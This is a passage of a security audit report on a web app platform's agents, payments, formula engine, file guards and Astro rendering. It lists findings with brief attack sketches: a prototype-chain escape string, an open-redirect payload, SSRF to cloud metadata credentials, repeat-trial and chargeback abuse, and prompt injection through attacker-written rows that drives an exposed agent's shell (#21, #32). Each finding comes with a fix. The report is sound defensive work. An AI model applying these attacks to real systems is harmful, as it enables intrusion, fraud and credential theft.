  (`docs/tutorial-payments.md:101,118`), and it stays open until the `payment.succeeded` trigger
  runs; `order_paid`, `take_stock` and `deliver_downloads` (`:285-330`) read the live lines.

**Attack.** A guest puts one cheap item in the basket and calls `api.runCheckout({order})`. Before
paying (a Stripe session lasts up to 24 h) they add expensive items or downloads, or raise
quantities, through ordinary REST writes, then pay the original total. The webhook marks the order
paid, takes the stock and creates `downloads` rows for everything now in the basket.

**Fix.** Re-run `chargedLines` at processing time and, on a mismatch, record an issue and a
mismatch event instead of `payment.succeeded`; or offer a "lock the row at checkout" setting. Put
the charged lines (with `item`) on `pay_events`. Rewrite the tutorial so `pay_checkout` moves the
order out of `open` and deliveries come from the charged lines.

**Fixed:** the checkout keeps the priced lines and the settings that priced them (`charged`); at
`payment.succeeded` they are worked out again and compared, with the paid amount; a difference is
logged as `payment.mismatch` instead, with an issue on the payment. `pay_events.lines` carries the
charged lines. To read the rows, a module's webhooks and services may now read the tables an
admin named in its actions' trigger configurations (and their Ⱶ-paths). The tutorial explains the event but keeps its triggers, which do not run on a
mismatch.

### 19. Medium–High — repeated trials give unlimited plan access and credits

`trialing` grants the plan's role (`plugins/payments/plans.js:75,204-217`) and its credit allowance
for the trial period (`:177-182`), keyed per subscription and period end (`processing.js:214`).
`prepareCheckout` / `subscriptionLine` (`checkout.js:241-249,329-339`) never check for an earlier
subscription or trial on the plan. A user subscribes with a trial (card not charged), uses the role
and the credits, cancels, and subscribes again for a new trial and a new allowance — or opens
several trial checkouts at once to stack them. The tutorials (`tutorial-payments-credits.md:95`,
`tutorial-payments-saas.md:220`) configure exactly this. Stripe and Polar do not block repeat
trials by default. **Fix:** refuse a trial when the user has had any subscription or trial on the
account (check the mirror, keyed per user); optionally refuse a second live subscription; grant a
smaller trial allowance, or credits only from the first paid period.

---

## Second review: Medium

### 20. Exposed agents: anonymous visitors act as `view_app_user`

`RunCaller::anonymous()` has `user: None` (`sc-agent/src/agent_trait.rs:413-419`) and is used for
signed-out askers (`sc-server/src/app_agents.rs:184-220`). `view_app::viewer`
(`coding/view_app.rs:298-319`) and `call_api::sender` (`call_api.rs:224-235`) read "no user" as
"nobody is chatting" and fall back to the configured `view_app_user`; neither tool is caller-gated
(`coding.rs:253,440,479,508`), and `check_exposed_agents` (`sc-app/src/exposed_agents.rs:443-473`)
does not look at traits. An agent with the `coding` trait and a staff or admin `view_app_user`,
exposed with `anonymous: true`, lets any visitor `call_api GET /api/<table>` as that account (and,
for an admin, reach #15). **Fix:** an explicit anonymous marker so `viewer`/`sender` use the public
identity; or refuse anonymous exposure of agents with `coding`/`admin_copilot`.

### 21. Exposed agents re-open admin-level tools to app-origin script

`{mount}/_agents/...` goes straight to `app_agents::handle` (`router.rs:1614-1619`), gated only by
the agent's `min_role` (`app_agents.rs:146`, `chat.rs:493-501`). Shell, process, module-install,
scripts/check and `admin_copilot` are gated on `is_admin(caller)` (`coding.rs:516-545,718-720`;
`admin_copilot.rs:309-399`), and an admin chatting through an app is a plain `RunCaller::user`. If
an admin exposes such an agent in an app and is signed in there, any script on that origin can POST
`/api/_agents/<name>/chat` with the admin's cookie and CSRF token and drive the shell — what the #5
fix closed for `/admin/agent-chat`. Prompt injection over attacker-written rows works the same way.
**Fix:** mark app-originated runs so `is_admin` is false for host-code and copilot tools (like
`triggered`), or refuse to expose agents carrying those traits.

### 22. No rate limit or spending cap on exposed agents

`app_agents.rs` uses no `sc_ratelimit` (limits exist only for login, reset, webhooks, guest
sessions and custom queries). A turn may take `DEFAULT_MAX_STEPS = 250` model steps
(`sc-agent/src/agent.rs:175`) with unlimited concurrent turns; credits are optional and cannot apply
to anonymous callers. Signup (`sc-api/src/rest/mod.rs:1160`) is unthrottled, so `min_role` 80
agents are open to scripted sign-ups (each also an argon2 hash). A bot can drain the provider budget.
**Fix:** per-IP and per-owner rate limits and a concurrency cap on `_agents` routes; per-exposure
daily budgets; lower `max_steps` for anonymous exposures; throttle signup.

### 23. Formula isolate: full JavaScript, shared state, no heap limit (verified; upgrades the first review's template item)

- `crates/sc-expr/src/ast.rs:195,282-293` lowers any member access (static or computed) and any call;
  `analyze.rs:203-222` validates only ambient (`row`/`user`/…) properties. Nothing refuses
  `constructor`, `__proto__` or `prototype`, so `` ``.constructor.constructor(`…`)() `` runs
  arbitrary statements, assignment included.
- `crates/sc-expr/src/eval.rs:383` builds one long-lived isolate for every formula in the process
  with `RuntimeOptions::default()`: no heap limit or near-heap-limit callback (the 250 ms watchdog
  bounds only CPU).
- Consequences: a formula can permanently replace globals for all later evaluations
  (`JSON.stringify`, which wraps value-mode results; `Array.prototype.includes`/`some`, which flips
  ownership formulas on the reified path), stash other evaluations' bindings, or allocate until V8
  aborts the server.
- Formulas are admin-authored, and REST/GraphQL/query-string filters never reach the evaluator. The
  non-admin route is `{{= field }}` re-interpolation (`sc-expr/src/template.rs:382-411`): row data is
  re-parsed as a template; text mode does no escaping and HTML mode's `escape_html` leaves backticks,
  so a quote-free payload survives.

**Fix.** Refuse the member names `constructor`, `__proto__` and `prototype` (static, and computed
values at run time) when lowering; freeze intrinsics after the prelude; give the isolate a heap limit
with a near-heap-limit callback that recycles it; parse `{{= }}` values from row data as literal text
or under a schema-validated subset.

### 24. Astro scaffold publishes rows at admin authority (verified)

`plugins/astro/index.js:319-331` generates one page per table with a REST `list` endpoint
(`sc-app/src/scaffold/context.rs:41,58-61`) that does `db.<table>.limit(50).rows()` — admin
authority, no `asUser()` — showing four fields (`email` for `users`). Anonymous renders are cached.
On a public site, `GET /orders` or `/users` returns up to 50 rows the API itself would refuse.
**Fix:** scaffold `db.<table>.asUser()`, or scaffold only tables whose list endpoint is public with
no ownership rule, with a comment explaining why.

### 25. Prerendered Astro pages bypass the application's admission check (verified)

`crates/sc-app/src/server_render.rs:465-475` serves static files *and* refreshable prerendered pages
before `if !req.admitted` (`:478`); `refresh()` re-renders at admin authority with `caller: None`
(`:251-277`). A members-only site's `prerender = true` or `refresh = true` page that reads tables is
served to anonymous visitors. **Fix:** for server-rendered apps, serve only non-HTML assets
(`_astro/*`, `public/`) to non-admitted callers; send prerendered HTML and refreshable pages through
the same 403.

### 26. Unauthenticated resource exhaustion through `/_image`

`crates/sc-app/src/server_render/images.rs:223-285`, reached before admission
(`server_render.rs:457-464`): no in-flight dedup or concurrency limit; the `too_many` check and
`keep` are not atomic, so concurrent requests for distinct `w`/`h`/`f`/`q` all pass, each decoding
(sources up to 16384²) and Lanczos-resizing on `spawn_blocking` (512 threads); `per_source` is
decremented on eviction, so the 32-variant cap does not hold. A few hundred parallel requests
exhaust memory on a small host. **Fix:** a small per-site semaphore and in-flight dedup; count
variants since mount (never decremented) or accept only the sizes the build emitted (signed);
lower `MAX_DECODE_SIDE`.

### 27. `fetch` action with a templated host is an SSRF that returns the response

`crates/sc-core-actions/src/fetch.rs:146-205` renders the URL from the event, checks only the
scheme (`:248-260`) and uses the unrestricted client; the parsed body is the action's result,
returned to the caller of a directly-run trigger (`:44-47`), and non-2xx errors quote 300 characters
of the body (`:194-201`). `send_email` applies `is_public` with IP pinning for exactly this reason
(`sc-email/src/relay.rs:6-10`). With `url = {{ webhook_url }}` (or a payload value) on a trigger a
user can fire, the user reads `http://169.254.169.254/…` credentials. Needs an admin to template
the host. **Fix:** when a token falls in the scheme or authority, apply `HostPolicy` +
`PublicResolver` and check each redirect hop; or refuse tokens before the path at save time (also
fixes the first review's encoding item).

### 28. Write responses return rows the caller may not read (verified)

`crates/sc-api/src/rest/mod.rs:1252-1266` answers create and update with `client_row(table, row)`
without a read check; `graphql/mutate.rs:163-192` (`delete`) returns the removed row likewise
(GraphQL insert/update do check, via `read_back`). An update whose body only resends Secret fields
as the sentinel changes nothing and returns the row (`rows.rs:960-975`). On a table whose write
floor is more permissive than its read floor (a public submission form read by staff), a caller who
meets only the write floor reads any row by id. **Fix:** return the row only if the caller may read
it (reuse `read_back`); otherwise return the key only.

### 29. Offline-sync pull lists the keys of changed rows the caller cannot read

`crates/sc-api/src/sync/pull.rs:224-258` computes `removed = changed - found`, where `changed`
(`sc-catalog/src/sync.rs:208-248`, `changed_keys`) is a raw change-log query with no readability
filter and `found` is access-filtered. Every changed key the caller may not read lands in `removed`:
a signed-in user with a device learns the existence, keys and change timing of other users' or
tenants' rows on synced tables (not their contents). **Fix:** emit `removed` only for keys that were
deleted or previously delivered to this device; at minimum, document it.

### 30. Module workers: host bridge globals are writable (verified; #11 bypass)

`crates/sc-module/src/js/module-host.mjs:255` sets `globalThis.__scDbCall` by plain assignment, and
`DB_PRELUDE`'s `send` (`sc-expr/src/code.rs:1316`) looks it up on every call. (Code-body isolates
define it as fixed, `code.rs:3472`; module workers do not.) Any module on a worker can wrap it and
observe the unguessable tokens of other calls in flight, including admin-triggered ones, and act as
those callers. **Fix:** define `__scDbCall` and the other host globals `writable: false,
configurable: false` before any module loads, capture the reference in the prelude, and bind each
request to the module that owns the call.

### 31. The `.git` guard checks spelling, not where a path lands (#4/#12 bypass)

`crates/sc-files/src/local.rs:107-115` (`resolve_for_write`) applies `in_git_dir` to the path as
written; `beneath_root` (`:189-235`) only checks the canonical path is under the root, which `.git`
is. Reads (`check_access`) and the `/files/serve` dot-segment check are also by spelling. A symlink
in the working tree pointing into `.git` (it can arrive with a pull) makes `.git/config` writable and
readable again — the original #4 command-execution route. On NTFS with 8.3 names, `GIT~1` also
misses the check (suspected). **Fix:** after canonicalising, apply `in_git_dir` to the path relative
to the root on reads and writes; refuse `git~<digits>` segments as git's `core.protectNTFS` does.

### 32. The "triggered" marker is lost across trigger chains (#3)

`RunCaller.triggered` is dropped when tools build a caller context (`run_trigger.rs:139`,
`insert_row.rs:118`, `update_rows.rs:164`, `write.rs:63`), and `run_agent.rs:180-190` grants
`RunCaller::system()` from its own `trusted_input` setting without regard to who caused the event.
A run started from untrusted input can write a row or call a trigger that fires a `trusted_input`
`run_agent`, which then has shell and module-install tools. Needs such a chain to exist. **Fix:**
carry an "untrusted origin" flag in the caller context and event; grant `system()` only without it.

### 33. Test-mode and fake payment accounts grant real roles and credits

`plugins/payments/adapters/index.js:36-41` refuses the fake adapter only in `live` mode; processing
never checks `account.mode` before granting (`processing.js:174-273`). The fake routes are
unauthenticated (`webhooks.js:254-305`); its portal `change` takes any price (`:126`) and `renew`
(`:129`) advances to a new period — a new allowance key each click. A production app with a fake
account (or test-key Stripe account) left enabled on any trigger — the tutorial leaves the fake
`shop` account enabled (`tutorial-payments.md:377-396`) — hands out roles and unlimited credits.
**Fix:** fake accounts only behind a server dev flag; test-mode accounts grant nothing unless an
explicit option is set; warn on the module card.

### 34. Chargebacks and partial refunds never revoke a purchase

`paymentRole` revokes only on `refunded` (`processing.js:245-251`); credits are never revoked
(`:264-273`, documented); Stripe's `paymentStatus` ignores disputes, so a lost chargeback leaves
`succeeded` (`adapters/stripe.js:243-259`); `dispute.*` events are only logged. A buyer spends a
credit pack and charges it back, keeping the role and credits. **Fix:** on a lost dispute or full
refund, revoke the role and claw back the unspent part of the payment's credit bucket.

### 35. Polar customers bound to users by email (suspected)

Polar checkouts send `customer_email` when the user has no known customer
(`adapters/polar.js:442-443`); `upsertCustomer` binds a provider customer to the first user that
names it (`processing.js:133-150,280-282`); `pay_portal` and `pay_charge_saved` trust that binding
(`subscriptions.js:109-115`, `charge.js:103-117`); signup does not verify email. If Polar finds the
existing customer by email, an attacker who signs up with a victim's address and buys something
cheap gets the victim's customer bound to them: portal access (orders, invoices, address,
subscriptions) and charges to the victim's saved card. Not checked against Polar's behaviour.
**Fix:** send `external_customer_id = user.id` and bind only when the provider's `external_id`
matches; re-check ownership before portal or saved-card use.

---

## Second review: Low / hardening

**Files, rendering, cookies**

- **Static directories skip #5 and #12** (`sc-server/src/router.rs:2108-2188`, `serve_static_dir`):
  inline with the asset type, no `as_user_content`, only `.git` refused (`.env` served). Matters if a
  static directory overlaps a store that uploads, File fields or non-admin agents write to.
  Refuse dot segments; refuse such overlaps or apply the user-content treatment.
- **`secure_cookies` off behind a TLS proxy** (`sc-server/src/config.rs:100-102,322`,
  `sc-cli/src/main.rs:182-188`): turned on only when Feldspar terminates TLS. Forgetting the flag
  drops `Secure`, falls back to the tossable `sc_csrf` (undoing #6, and making an anonymous agent
  owner — a hash of the CSRF cookie, `uploads.rs:223-240` — fixable), and makes reset/invite links
  `http://`. Turn it on when a trusted proxy sends `X-Forwarded-Proto: https`, or refuse to start.
- **`/_goal/` open redirect** (`plugins/astro/files/server.mjs:1455-1487`): the local-path test
  does not reject control characters; `?to=%2F%09%2Fevil.example` yields `Location: /\t/evil.example`,
  which browsers normalise to `//evil.example`. Low–Medium. Reject control characters and `\`, or
  require same origin after `new URL(to, origin)`.
- **Goal / `<Optimise>` analytics poisoning** (`server.mjs:1233-1290,1391-1434`): every cookieless
  `GET /_goal/<any>` mints a visitor and inserts a conversion. Count only visitors with an exposure,
  allow only goal names in the build, rate-limit.
- **Analytics Markdown `javascript:` filter** (`ui/analytics/src/panels/markdown.ts:107-112,186-203`)
  is bypassed by a leading C0 character; blocked today only by `script-src 'self'`.
- **Builder canvas HTML injection** (`ui/builder/vendor/saltcorn-builder/components/elements/*.js`,
  `dangerouslySetInnerHTML` of previews of a table's first row, `ui/saltcorn-ui/src/builder-routes.ts`):
  row HTML (e.g. through the Markdown plugin) lands in the admin's DOM; script is blocked by the
  builder CSP, but phishing markup / meta refresh is not. Sandbox or DOMPurify the previews.
- **Markdown plugin on Saltcorn-UI pages**: because that CSP has `'unsafe-inline'`, the first
  review's Markdown item is directly exploitable stored XSS for other app users, not merely Low.
- **Goal-link signing secret** sits in `dist/_server/entry.js`; anyone who can read the source store
  can sign off-site goal redirects (subsumed by #16's fix).

**Code execution and modules**

- **View-call file and trigger hosts honour a guest-chosen admin authority**
  (`sc-viewpattern/src/framework.rs:1422-1458`): only the table host is `viewer_only()`;
  `V1Trigger.run` (`sc-module/src/js/module-host.mjs:3770-3778`) sends no authority, so it runs as
  admin past the trigger's `min_role`. Shipped patterns only pick admin-configured triggers, but any
  v1 viewtemplate plugin can read/write any file for an anonymous viewer. Clamp both hosts.
- **Code-bearing metadata tables can be given non-admin write floors**
  (`sc-api/src/metadata_tables.rs:36-55`, `schema_edit.rs:2233`): `_fd_triggers`,
  `_fd_code_libraries`, `_fd_file_stores`, `_fd_modules`, `_fd_model_instances`. Refuse it.
- **sklearn model state is a pickle** (`plugins/sklearn/feldspar_sklearn/plugin.py:28-41,68-77`):
  writable only by fits, restore, or the item above. Treat model rows and backups as code; consider
  an HMAC or `skops`.
- **Module `table_changes` subscriptions** (`sc-module/src/services.rs:780-826`) deliver every row
  with Secret fields decrypted and no per-row check — consistent with modules being trusted once
  installed; document it.

**Mail and webhooks**

- **TNEF allocation** (`plugins/imap/tnef.js:158,167`): `Buffer.alloc(rawSize)` from an
  attacker's `winmail.dat` (up to 4 GiB) on a shared worker. Cap at a multiple of the compressed size.
- **No cap on MIME parts per mail** (`plugins/imap/sync.js:334-360`): one file + row per leaf.
  Cap (e.g. 200) and record the rest in `import_error`.
- **Module webhook responses** (`sc-server/src/webhooks.rs:140-149`) are served on every host with
  module-chosen headers and no CSP default; add `sandbox` unless the module sets a CSP; strip
  `Set-Cookie`.
- **Payments webhook 404 lists every account name** (`plugins/payments/accounts.js:16-22`,
  `webhooks.js:31-36,258-262`) to unauthenticated callers. Return a generic 404.
- **OAuth consent URL** (`sc-server/src/oauth.rs:428-447`) is consumed before the session-user check,
  so anyone holding the link can make the owner's flow fail.

**Agents and credits**

- **Triggered agent runs are never metered** (`run_agent.rs:183-191`, `driver.rs:549-555`): an
  exposed `run_agent` trigger with a payload prompt gives a signed-in user free model calls. Charge
  the event's user.
- **Concurrent runs push a balance into unlimited debt** (`driver.rs:569-578` reads without
  reserving). Cap concurrent metered runs per user or reserve an estimate.
- **`pay_change_subscription` with proration `none`** (`subscriptions.js:24,143-147`) gives free
  upgrades until renewal; admin-chosen — document or disallow for upgrades.
- **Anonymous `GET …/_agents/<name>/runs`** (`app_agents.rs:520-531`, `run_store.rs:199-216`) loads
  every user-less run of the agent, unpaginated, and filters in memory; runs are saved before the
  model call, so they are cheap to create. Filter in SQL and paginate.
- **Concurrent turns on one conversation** (`app_agents.rs:293,398-406`): the Running check is not
  atomic; two POSTs interleave saves and double-spend. Compare-and-set the state.
- **`prompt_template` does not constrain an exposure**: `chat` defaults to true, and template values
  are inserted raw. Warn or refuse when both are set.

**Data access**

- **GraphQL `where`/`order_by` on Secret columns — still unfixed** (`sc-api/src/graphql/args.rs:204-233,276-309`):
  the first review's mitigation note ("protected only by the generated input types") is inaccurate:
  `graphql/build.rs:282-303` emits inputs for Secret columns. Only `is_null` leaks anything (the
  column is ciphertext). Route through `filter::queryable_field`.
- **Undo conflict report** (`sc-api/src/undo.rs:384-397,486-545`) reads the current row in an admin
  context and returns changed fields' current values, even if the caller can no longer read the row.
  Gate `Conflict.actual` on a fresh read check.

**Operations**

- **CLI `write_private`** (`sc-cli/src/auth.rs:298-314`): `mode(0o600)` applies only on create; an
  existing 0644 file (or a symlink) keeps its mode or is followed. Write a temp file with
  `O_EXCL|O_NOFOLLOW` and rename.
- **Single-use tokens in request logs** (`sc-server/src/logging.rs:63-69`): `admin-handoff?token=`
  and OAuth `/complete?token=` are logged at Info. Redact `token=`.
- **"Clear all" reopens first-user setup** (`sc-server/src/clear_all.rs`, `sc-api/src/admin.rs:76-80`):
  it deletes every user, after which `createFirstUser` is public on a live server. Keep the clearing
  admin or require a CLI-issued setup token.
- **`own_origin` keeps the `Host` header's port** (`router.rs:2727`): harmless unless someone else
  controls another port on the same host.

---

## Second review: checked and found sound

- **Fixes 1–13**: hold for the paths they named. `host_header_guard` wraps the whole router and links
  are built only for resolved apps; OAuth start/consent refused on unserved hosts; host-code tools
  gated at listing and at call; `.git` writes refused on every backend (but see #31); CSRF compare
  constant-time; every password login (admin, REST, Saltcorn-UI) throttled; the `users` column guard
  sits in the row layer, so REST, GraphQL, sync push, CSV import, undo/restore, code bodies and
  actions all inherit it; Deno `file:` loads fenced; backslash and drive paths refused.
- **Payments**: amounts, currency, credits and role effects computed server-side and frozen on the
  checkout mirror; HMAC over raw bytes with constant-time compare and 300 s window for Stripe, Polar
  and fake; provider re-fetch; idempotent events; credits ledger transactional with the user row
  locked; payment tables admin-write; role ceiling 50, role 1 refused; redirects path-only; guest
  sessions 244-bit, hashed, app-scoped.
- **Data access**: reads, embeds, aggregates, sync and history funnel through
  `read_row_values_as` / `join_guard` / `aggregate_guard` / `RowImage::readable`; ownership checked on
  existing and merged rows; sync push via `write_as` with device↔user binding and server-issued keys
  (no id collision); history and undo writes as the caller; dataset reader rewrites each table to
  the caller's readable rows; live fan-out re-checks old and new images; role convention
  `role <= min_role` applied consistently.
- **Rendering**: render cache only for anonymous GETs, keyed by origin/path/query/locale, per-visitor
  reads mark pages uncacheable, admission before cache lookup; server cookies withheld from pages;
  Astro runtime escapes text and attributes (`set:html` the only raw path); Rust HTML generation
  escapes interpolations; admin, IDE and Analytics UIs use no raw-HTML sinks (except the builder,
  above); CSPs `script-src 'self'` everywhere but Saltcorn-UI and the IDE (documented).
- **Code execution**: code bodies bounded by wall clock, CPU slice, call budget and heap; authors
  are admins; workflows, triggers and 223 of 227 admin endpoints `admin()` (the rest auth/status);
  no YAML/bincode/pickle deserialisation except sklearn state; every `Command::new` call site has
  admin- or server-chosen arguments.
- **Mail and network**: lettre encodes CR/LF in headers; SMTP overrides restricted to public,
  pinned addresses with verified certificates; IMAP connects to the checked address; certificate
  settings are admin module settings; mail OAuth uses PKCE, single-use state and a binding cookie and
  never returns tokens; attachment filenames sanitised; ACME names never taken from SNI; secrets shown
  as a sentinel in the admin UI; logging prints no credentials.
- **Privileged surfaces**: typed admin endpoints never reachable on app hosts; app agents bind runs
  to agent, app, mode and owner (no IDOR); exposed triggers default to admin floor; MCP bearer-only
  with per-call admin re-check; body limits and `row_cap` in place; no regex filter operator.

## Second review: not covered in depth

The full vendored Saltcorn-UI v1 runtime (spot checks only: `safe_href`, `safe_redirect`,
`sqlsanitize`, eval sites); typed `api.run<Name>()` return projection; Polar's checkout behaviour
(for #35); browser-specific behaviour was not tested for the `/_goal` redirect.

## Second review: recommended order

1. App-origin access to admin authority: #15 (host guard on admin routes), #21, #20.
2. Edit-to-execute: #16 (output dir / build files / LSP), #31, #32, #30.
3. #17 (mail credentials) — a one-function fix.
4. Payments integrity: #18, #19, #33, #34, then #35.
5. #23 (formula isolate), #24, #25, #28, #27, #22, #26, #29.
6. The Low / hardening list.
